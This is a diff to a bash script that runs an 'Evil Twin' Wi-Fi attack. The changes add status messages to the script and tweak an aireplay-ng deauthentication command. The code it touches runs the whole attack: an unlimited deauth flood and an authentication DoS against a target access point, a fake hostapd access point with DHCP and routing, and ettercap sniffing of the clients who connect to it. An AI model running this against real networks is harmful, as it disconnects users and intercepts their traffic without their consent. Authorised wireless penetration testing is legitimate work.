@@ -1086,7 +1086,7 @@ function exec_et_deauth() {
 			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
 		;;
 		"Aireplay")
-			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
+			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one -D ${iface_monitor_et_deauth}"
 		;;
 		"Auth DoS")
 			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
@@ -1306,16 +1306,22 @@ function restore_et_interface() {
 function _et_cleanup() {
 	echo
 	echo "[*] Stopping Evil Twin attack..."
+	echo "[*] Killing attack windows..."
 	kill_et_windows
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
+	echo "[*] Cleaning up iptables rules..."
 	clean_initialize_iptables_nftables "end"
+	echo "[*] Restoring interface..."
 	restore_et_interface
 	if [ "${ettercap_log}" -eq 1 ]; then
+		echo "[*] Parsing ettercap log..."
 		parse_ettercap_log
 	fi
+	echo "[*] Cleaning up temp files..."
 	clean_tmpfiles "exit_script"
+	echo "[+] Cleanup complete."
 	exit 0
 }
 
@@ -1328,29 +1334,56 @@ function exec_et_sniffing_attack() {
 	ip link set "${interface}" down > /dev/null 2>&1
 	iw "${interface}" set type managed > /dev/null 2>&1
 	ip link set "${interface}" up > /dev/null 2>&1
+	echo "[+] Interface ready."
 
 	# Write channel file for control window display
 	echo "${channel}" > "${tmpdir}${channelfile}"
 
+	echo "[*] Generating hostapd config (Fake AP: ${essid} on ch${channel})..."
 	set_hostapd_config
+	echo "[*] Launching Fake AP..."
 	launch_fake_ap
+	echo "[+] Fake AP launched."
+
+	echo "[*] Configuring network interface..."
 	set_network_interface_data
 	set_dhcp_config
+	echo "[*] Setting up routing rules..."
 	set_std_internet_routing_rules
+	echo "[+] Routing configured."
+
+	echo "[*] Launching DHCP server..."
 	launch_dhcp_server
+	echo "[+] DHCP server running."
+
+	echo "[*] Starting deauth attack (${et_dos_attack}) on ${bssid}..."
 	exec_et_deauth
+	echo "[+] Deauth started."
+
+	echo "[*] Launching ettercap sniffer..."
 	launch_ettercap_sniffing
+	echo "[+] Sniffer running."
+
+	echo "[*] Setting up control window..."
 	set_et_control_script
 	launch_et_control_window
 	write_et_processes
 	echo
-	echo "[*] Evil Twin Sniffing attack running. Press Ctrl+C to stop."
+	echo "[+] All components running. Press Ctrl+C to stop."
 	while true; do sleep 1; done
 }
 
 # ============================================================
 # Pre-run validation
 # ============================================================
+
+echo "[*] Starting Evil Twin Sniffing Attack..."
+echo "    Target BSSID : ${bssid}"
+echo "    Target ESSID : ${essid}"
+echo "    Channel      : ${channel}"
+echo "    Interface    : ${interface}"
+echo "    DoS method   : ${et_dos_attack}"
+echo
 
 if [ "$(id -u)" -ne 0 ]; then
 	echo "[!] Root privileges required. Run with sudo." >&2
@@ -1363,15 +1396,23 @@ if [ -z "${interface}" ] || [ -z "${internet_interface}" ] || [ -z "${bssid}" ] 
 	exit 1
 fi
 
+echo "[*] Checking configuration... OK"
+
 if [ -z "${phy_interface}" ]; then
 	phy_interface=$(physical_interface_finder "${interface}")
+	echo "[*] Physical interface detected: ${phy_interface}"
 fi
 
+echo "[*] Detecting distro window ratios..."
 detect_distro_window_ratios
+echo "[*] Window ratios set (xratio=${xratio}, yratio=${yratio})"
 
 mkdir -p "${tmpdir}"
 echo "${agpid_to_use}" > "${system_tmpdir}${ag_orchestrator_file}"
 
+echo "[*] Checking interface band support..."
 check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+echo "[*] Interface band: ${interfaces_band_info[main_wifi_interface,text]}"
+echo
 
 exec_et_sniffing_attack
